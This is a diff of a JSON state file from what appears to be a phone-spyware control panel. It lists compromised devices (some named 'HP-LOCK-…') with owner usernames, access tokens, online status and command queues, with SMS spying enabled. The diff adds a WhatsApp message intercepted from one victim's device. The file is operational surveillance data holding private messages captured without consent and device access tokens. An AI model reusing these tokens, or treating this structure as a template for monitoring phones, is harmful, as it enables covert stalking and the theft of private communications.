@@ -36,7 +36,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "729a4fc8ab7614c8892066df29eb7c03",
-    "lastSeen": 1775905626841,
+    "lastSeen": 1775905647887,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T09:04:13.167Z",
@@ -52,6 +52,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎» luvyu « (5 pesan): Menyebut Anda",
+        "content": "~ bot reysa: 27 on gda yg nim ytim",
+        "time": "11/04 18:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775905649177
+      },
       {
         "appName": "WhatsApp",
         "sender": "» luvyu «",
@@ -357,7 +365,7 @@
     "deviceName": "HP-LOCK-236E",
     "ownerUsername": "Riz99",
     "token": "25f27c309061b42c3e6310cc706ba952",
-    "lastSeen": 1775905627879,
+    "lastSeen": 1775905648893,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T09:23:23.787Z",
@@ -389,7 +397,7 @@
     "deviceName": "HP-LOCK-F00B",
     "ownerUsername": "Riz99",
     "token": "e13e997b60c0fcca110bf105c3d2f904",
-    "lastSeen": 1775905626758,
+    "lastSeen": 1775905647793,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T09:39:58.599Z",
